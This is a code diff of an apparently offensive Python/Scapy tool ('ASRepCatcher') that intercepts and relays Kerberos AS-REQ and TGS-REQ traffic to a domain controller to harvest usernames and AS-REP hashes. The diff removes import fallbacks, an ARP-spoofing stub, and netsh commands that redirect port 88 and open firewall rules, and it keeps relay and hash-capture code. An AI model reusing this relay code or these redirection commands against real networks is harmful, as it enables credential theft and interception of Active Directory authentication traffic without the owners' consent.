@@ -10,42 +10,9 @@ from scapy.config import conf
 from scapy.arch import get_if_list, get_if_addr
 from scapy.packet import Packet, bind_layers, Raw
 from scapy.fields import XIntField, StrField
-
-# Import Kerberos layers - CRITICAL for proper operation
-try:
-    from scapy.layers.kerberos import *
-    from scapy.asn1.asn1 import ASN1_INTEGER
-    KERBEROS_LAYERS_AVAILABLE = True
-except ImportError as e:
-    KERBEROS_LAYERS_AVAILABLE = False
-    
-    # Define minimal stubs to prevent import errors - BUT THESE WON'T WORK
-    class KRB_AS_REP: pass
-    class KRB_TGS_REP: pass  
-    class KRB_AS_REQ: pass
-    class KRB_TGS_REQ: pass
-    class KRB_ERROR: pass
-    class KerberosTCPHeader: pass
-    class Kerberos: pass
-    class ASN1_INTEGER: pass
-
-# Try to import getmacbyip from different locations
-try:
-    from scapy.layers.l2 import getmacbyip
-except ImportError:
-    try:
-        from scapy.utils import getmacbyip
-    except ImportError:
-        # Fallback function if getmacbyip is not available
-        def getmacbyip(ip):
-            """Fallback function to get MAC address for IP"""
-            try:
-                ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=2, verbose=False)
-                if ans:
-                    return ans[0][1].hwsrc
-            except:
-                pass
-            return None
+from scapy.layers.kerberos import *
+from scapy.asn1.asn1 import ASN1_INTEGER
+from scapy.layers.l2 import getmacbyip
 
 import asn1
 import os
@@ -79,6 +46,9 @@ from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn, TimeEl
 from rich.layout import Layout
 from rich.align import Align
 from rich import box
+
+import time
+import struct
 
 # Global variables
 decoder = asn1.Decoder()
@@ -117,8 +87,6 @@ skip_redirection = False
 debug_messages = []
 MAX_DEBUG_MESSAGES = 10
 
-import time
-import struct
 
 # =======================================
 # RICH DISPLAY MANAGEMENT
@@ -318,7 +286,7 @@ def rich_print_hash(username, domain, etype, hash_string):
         f"[bold cyan]Username:[/bold cyan] {username}@{domain}\n"
         f"[bold yellow]Encryption Type:[/bold yellow] {etype}\n"
         f"[bold green]Hash:[/bold green] {hash_string}",
-        title="[bold green]🎯 HASH CAPTURED! 🎯[/bold green]",
+        title="[bold green] HASH CAPTURED! [/bold green]",
         border_style="green",
         box=box.DOUBLE
     )
@@ -369,27 +337,6 @@ def setup_windows_networking():
         
     except Exception as e:
         rich_print_error(f"[SETUP] Windows networking setup error: {e}")
-
-def cleanup_windows_networking():
-    """Clean up Windows networking changes"""
-    try:
-        # Optionally restore IP forwarding (uncomment if needed)
-        # subprocess.run(['netsh', 'interface', 'ipv4', 'set', 'global', 'forwarding=disabled'],
-        #               capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
-        rich_print_info("[CLEANUP] Windows networking cleanup complete", "blue")
-    except Exception as e:
-        rich_print_error(f"[CLEANUP] Error during networking cleanup: {e}")
-
-def setup_arp_spoofing(target_ip, gateway_ip, interface):
-    """Setup ARP spoofing to force traffic through VM (requires Scapy)"""
-    try:
-        rich_print_info(f"[ARP] Setting up ARP spoofing: {target_ip} via {gateway_ip}", "yellow")
-        # Note: This would require additional ARP spoofing logic
-        # For now, just provide guidance
-        rich_print_warning("[ARP] Manual ARP spoofing setup required for complete relay mode")
-        rich_print_info(f"[ARP] Consider: arp -s {target_ip} <your-vm-mac> on gateway", "blue")
-    except Exception as e:
-        rich_print_error(f"[ARP] ARP spoofing setup error: {e}")
 
 # =======================================
 # SIGNAL HANDLING AND CLEANUP
@@ -971,87 +918,6 @@ def cleanup_traffic_redirection():
         rich_print_warning(f'[CLEANUP] Could not clean up Windows port redirection: {e}')
         logging.debug(f'[*] Could not clean up Windows port redirection: {e}')
 
-def setup_traffic_redirection_alt(interface_name, relay_port):
-    """Set up Windows traffic redirection for Kerberos packets to alternative port."""
-    try:
-        rich_print_info(f'[RELAY] Setting up traffic redirection from port 88 to {relay_port}...', 'yellow')
-        
-        # Clear any existing portproxy rules for port 88
-        try:
-            subprocess.run(['netsh', 'interface', 'portproxy', 'delete', 'v4tov4', 
-                          'listenport=88', 'listenaddress=0.0.0.0'], 
-                          capture_output=True, text=True, timeout=10)
-        except:
-            pass
-        
-        # Set up Windows port redirection from 88 to relay_port
-        result = subprocess.run(['netsh', 'interface', 'portproxy', 'add', 'v4tov4', 
-                               f'listenport=88', 'listenaddress=0.0.0.0', 
-                               f'connectport={relay_port}', 'connectaddress=127.0.0.1'], 
-                               capture_output=True, text=True, check=True, timeout=15)
-        
-        if result.returncode == 0:
-            rich_print_success(f'[RELAY] Successfully redirected port 88 to {relay_port}')
-            logging.debug(f'[*] Windows port redirection: 88 -> {relay_port}')
-            
-            # Add firewall rule for the alternative port
-            try:
-                subprocess.run(['netsh', 'advfirewall', 'firewall', 'add', 'rule', 
-                              f'name=ASRepCatcher_Kerberos_{relay_port}', 'dir=in', 'action=allow', 
-                              f'protocol=TCP', f'localport={relay_port}'], 
-                              capture_output=True, text=True, timeout=10)
-                logging.debug(f'[*] Added firewall rule for port {relay_port}')
-            except Exception as fw_e:
-                rich_print_warning(f'[RELAY] Could not add firewall rule for port {relay_port}: {fw_e}')
-        else:
-            rich_print_error(f'[RELAY] Failed to set up port redirection: {result.stderr}')
-            logging.error(f'[!] netsh portproxy failed: {result.stderr}')
-            
-    except Exception as e:
-        rich_print_error(f'[RELAY] Could not set up alternative port redirection: {e}')
-        rich_print_info('[RELAY] Note: Traffic redirection may not work without proper setup')
-
-def setup_traffic_redirection(interface_name):
-    """Set up Windows traffic redirection for Kerberos packets."""
-    try:
-        # First, check if portproxy service is available
-        check_result = subprocess.run(['netsh', 'interface', 'portproxy', 'show', 'all'], 
-                                    capture_output=True, text=True, check=True, timeout=10)
-        
-        # Clear any existing portproxy rules for port 88
-        try:
-            subprocess.run(['netsh', 'interface', 'portproxy', 'delete', 'v4tov4', 
-                          'listenport=88', 'listenaddress=0.0.0.0'], 
-                          capture_output=True, text=True, timeout=10)
-        except:
-            pass  # Ignore if rule doesn't exist
-        
-        # Set up Windows port redirection for Kerberos
-        # Note: This redirects external traffic to localhost - you may need WinDivert for more advanced scenarios
-        result = subprocess.run(['netsh', 'interface', 'portproxy', 'add', 'v4tov4', 
-                               'listenport=88', 'listenaddress=0.0.0.0', 
-                               'connectport=88', 'connectaddress=127.0.0.1'], 
-                               capture_output=True, text=True, check=True, timeout=15)
-        
-        if result.returncode == 0:
-            logging.debug('[*] Set up Windows port redirection for Kerberos')
-            
-            # Also try to configure Windows Firewall to allow the redirection
-            try:
-                subprocess.run(['netsh', 'advfirewall', 'firewall', 'add', 'rule', 
-                              'name=ASRepCatcher_Kerberos', 'dir=in', 'action=allow', 
-                              'protocol=TCP', 'localport=88'], 
-                              capture_output=True, text=True, timeout=10)
-                logging.debug('[*] Added Windows Firewall rule for Kerberos')
-            except Exception as fw_e:
-                logging.warning(f'[!] Could not add firewall rule (may need manual configuration): {fw_e}')
-        else:
-            raise Exception(f"Port proxy setup failed with return code {result.returncode}: {result.stderr}")
-            
-    except Exception as e:
-        logging.error(f'[!] Could not set up Windows port redirection: {e}')
-        logging.info('[*] Note: For advanced traffic redirection on Windows, consider using WinDivert or similar tools')
-        logging.info('[*] Alternative: Run the tool on the target machine or use network-level redirection')
 
 def restore_firewall_rules(backup_file):
     """Restore Windows Firewall rules from backup."""
@@ -1560,22 +1426,19 @@ async def relay_tgsreq_to_dc(data):
     global UsernamesSeen
     response = await relay_without_modification_to_dc(data)
     
-    # Simplified - just relay without complex parsing since we need real Kerberos layers
-    if KERBEROS_LAYERS_AVAILABLE:
-        try:
-            kerberos_packet = KerberosTCPHeader(response)
-            if not kerberos_packet.haslayer(KRB_TGS_REP):
-                return response
+    # Process the TGS-REP response
+    try:
+        kerberos_packet = KerberosTCPHeader(response)
+        if not kerberos_packet.haslayer(KRB_TGS_REP):
+            return response
+            
+        # Extract username from TGS-REP for tracking (simplified)
+        rich_print_info('[TGS-REP] TGS-REP response detected in relay mode', 'green')
+        add_debug_message("TGS-REP detected in relay")
+        # TODO: Implement proper ASN.1 parsing for username extraction
                 
-            # Extract username from TGS-REP for tracking (simplified)
-            rich_print_info('[TGS-REP] TGS-REP response detected in relay mode', 'green')
-            add_debug_message("TGS-REP detected in relay")
-            # TODO: Implement proper ASN.1 parsing for username extraction
-                    
-        except Exception as e:
-            rich_print_error(f'[TGS-REP] Error processing response: {e}')
-    else:
-        rich_print_warning('[TGS-REP] Kerberos layers not available - cannot parse TGS-REP')
+    except Exception as e:
+        rich_print_error(f'[TGS-REP] Error processing response: {e}')
     
     return response
 
@@ -1584,12 +1447,6 @@ async def relay_asreq_to_dc(data, client_ip):
     global UsernamesCaptured, Targets, InitialTargets
     
     try:
-        if not KERBEROS_LAYERS_AVAILABLE:
-            rich_print_warning('[AS-REQ] Kerberos layers not available - simple relay only')
-            response = await relay_without_modification_to_dc(data)
-            rich_print_info(f'[AS-REQ] Simple relay completed for {client_ip}', 'yellow')
-            return response
-        
         kerberos_packet = KerberosTCPHeader(data)
         decoder.start(bytes(kerberos_packet.root.reqBody.cname.nameString[0]))
         username = decoder.read()[1].decode().lower()
@@ -1665,10 +1522,6 @@ async def relay_asreq_to_dc(data, client_ip):
 
 async def relay_to_dc(data, client_ip):
     """Route Kerberos messages to appropriate relay handlers"""
-    if not KERBEROS_LAYERS_AVAILABLE:
-        rich_print_warning('[RELAY] Kerberos layers not available - simple relay only')
-        return await relay_without_modification_to_dc(data)
-    
     try:
         kerberos_packet = KerberosTCPHeader(data)
 
@@ -2088,16 +1941,8 @@ def main():
     global setup_complete
     setup_complete = False
     
-    # Check for Kerberos layer availability
-    if not KERBEROS_LAYERS_AVAILABLE:
-        rich_print_error('[CRITICAL] Scapy Kerberos layers are NOT available!')
-        rich_print_error('[CRITICAL] This script requires proper Kerberos support to work')
-        rich_print_error('[CRITICAL] Install with: pip install scapy[complete]')
-        rich_print_error('[CRITICAL] Or ensure scapy.layers.kerberos module is available')
-        rich_print_warning('[WARNING] Continuing anyway, but packet detection WILL NOT WORK')
-        time.sleep(3)
-    else:
-        rich_print_success('[IMPORT] ✓ Scapy Kerberos layers successfully loaded')
+    # Confirm Kerberos layer availability
+    rich_print_success('[IMPORT] ✓ Scapy Kerberos layers loaded')
     
     global mode, outfile, usersfile, HashFormat, iface, disable_spoofing, stop_spoofing
     global gw, dc, debug, hwsrc, Targets, InitialTargets, TargetsList
@@ -2528,7 +2373,3 @@ def main():
 
 if __name__ == '__main__':
     main()
-
-# Note: This script requires proper Scapy Kerberos layer support
-# If Scapy Kerberos layers are not available, install with: pip install scapy[complete]
-# or ensure scapy.layers.kerberos module is properly installed
